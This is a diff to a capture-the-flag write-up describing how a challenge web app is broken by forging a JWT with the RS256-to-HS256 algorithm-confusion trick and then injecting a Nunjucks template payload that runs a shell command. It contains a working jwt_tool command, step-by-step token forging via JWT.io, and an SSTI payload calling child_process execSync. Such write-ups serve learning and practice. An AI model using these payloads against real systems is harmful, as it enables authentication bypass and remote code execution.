@@ -46,7 +46,7 @@
 
 4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to "admin" using the RS256-to-HS256 exploit.
 
-5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible, but I found that running this command actually worked: `python3 jwt_tool.py -T "{JWT HERE}" -S hs256 -p "{PUBLIC KEY HERE}"`. So, with the key that would look like this:
+5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible, but I found that running this command actually worked: `python3 jwt_tool.py -T "{JWT HERE}" -S hs256 -p "{PUBLIC KEY HERE}"`. (Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).) So, with the key that would look like this:
 
     ```
     python3 jwt_tool.py -T "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTNuWlpMWHB3R3prVXM0N1J6UkRpXG5idkNFZzFFcllrcC9LWk1hclVqZTVWRGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUXG4rVHd3VHM3Y2toRG8rczFUVjhHV0RkWFFrb0l1dHRaak5DUUo2TG0zQ3ZlbEtJWW1jSUtwdlBCblRlRlJkMVh6XG5xUmdldnE2SlZSQ1lyeVFYMXhtckVQOVc5OFpWWGJQcE9GOTRHUWlpRU1RdWJNMGlMakdjVEFqRldVdXFaZlU3XG5iMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2htMDV0L0ZraU95XG55dVgwa0FFcDFKNzRRZXRMSXg0d0tmbjBIZjZXeUp0ejB2ZnV6YkJETWh2VDZyZXBtSXpCVW9ycHh6bk5UVForXG5xd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tIiwiaWF0IjoxNjM4NzMxMzQ3fQ.bnjglGFat38YIylfRdN-AubHq7FIpPgrISj3rGlVUJti_8ORBgF6alQDyEr742vUYaFaaONnhUlgSKyurANLKI1fNpAZCp0loN5D_mSk8B8PMSNArghxLB1P_2g36pd7ZWE8GQPFF2582fOYCK1zJreMKPozXGe3fjBNB6nqrNk21ReFQsPpuLfPM8HgK3jPXgyN5mN4HKMsLgObrA-5W3IhWglV64BHuNbpki5x0OGMedxTEtzuYqAhQbkOhz7x_GLI8c04lyJSY9dYVaNSsmU84gZJZ-5Hmk4GlQTtRwrV_OnSVxampPUk8MhIIeLHhUOiaWrRtmLbxiV1EaPK6g" -S hs256 -p "-----BEGIN PUBLIC KEY-----
@@ -71,6 +71,35 @@
 8. Searching for "nunjucks ssti" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag*')")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.
 
 9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag*')")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.
+
+### Alternative JWT Decoding Steps
+
+1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).
+
+2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/): `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----`.
+
+3. Base64 encode the public key with `echo -en "public key" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.
+
+    Command:
+
+    ```bash
+    echo -en "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----" | base64
+    ```
+
+    Output:
+
+    ```
+    LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR
+    OEFNSUlCQ2dLQ0FRRUEzblpaTFhwd0d6a1VzNDdSelJEaQpidkNFZzFFcllrcC9LWk1hclVqZTVW
+    RGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUCitUd3dUczdja2hEbytz
+    MVRWOEdXRGRYUWtvSXV0dFpqTkNRSjZMbTNDdmVsS0lZbWNJS3B2UEJuVGVGUmQxWHoKcVJnZXZx
+    NkpWUkNZcnlRWDF4bXJFUDlXOThaVlhiUHBPRjk0R1FpaUVNUXViTTBpTGpHY1RBakZXVXVxWmZV
+    NwpiMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2ht
+    MDV0L0ZraU95Cnl1WDBrQUVwMUo3NFFldExJeDR3S2ZuMEhmNld5SnR6MHZmdXpiQkRNaHZUNnJl
+    cG1JekJVb3JweHpuTlRUWisKcXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
+    ```
+
+4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to "HS256" and change the `username` field to "admin". Next, paste the base64 encoded key into the "your-256-bit-secret" field. Check the "secret base64 encoded" box, and now you should have your tampered JWT.
 
 ### Flag
 
